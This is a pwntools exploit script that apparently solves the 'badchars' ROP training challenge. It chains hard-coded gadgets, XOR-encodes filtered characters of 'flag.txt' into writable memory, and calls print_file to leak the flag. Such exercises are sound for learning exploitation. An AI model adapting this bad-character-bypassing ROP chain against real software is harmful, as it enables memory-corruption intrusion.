#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./badchars_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# pwn cyclic --context amd64 44 -a $(python3 -c 'import string; print(string.ascii_uppercase)')
padding = b'A' * 40

# ROPgadget --binary write4
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x00000000004006a3 : pop rdi ; ret
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
MOV_MEM = p64(0x400634)
POP_R12345 = p64(0x40069c)
POP_R14_R15 = p64(0x4006a0)
POP_RDI = p64(0x4006a3)
XOR = p64(0x400628)

# (r2) iS - to print sections adresses 
# 0x00001028   0x10 0x00601028   0x10 -rw- 0x3   PROGBITS    .data
# works with: 29, 2d, 2e, 2f
DATA_ADDR = 0x601029

# "flag.txt" string
FLAG_STR = p64(int.from_bytes(b"flag.txt", 'little'))

# (r2) aaa; afl
# 0x00400510    1      6 sym.imp.print_file
PR_FILE = p64(0x400510)

payload = padding
payload += POP_R12345 + FLAG_STR + p64(DATA_ADDR)
# hex(0xeb ^ ord("a")) = 0x8a
payload += p64(0x8a) + p64(DATA_ADDR+2) + MOV_MEM
# fix a: 0xeb ^ 0x8a
payload += XOR
# fix g
payload += POP_R14_R15 + p64(0x8c) + p64(DATA_ADDR+3) + XOR
# fix .
payload += POP_R14_R15 + p64(0xc5) + p64(DATA_ADDR+4) + XOR
# fix x
payload += POP_R14_R15 + p64(0x93) + p64(DATA_ADDR+6) + XOR
payload += POP_RDI + p64(DATA_ADDR) + PR_FILE

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
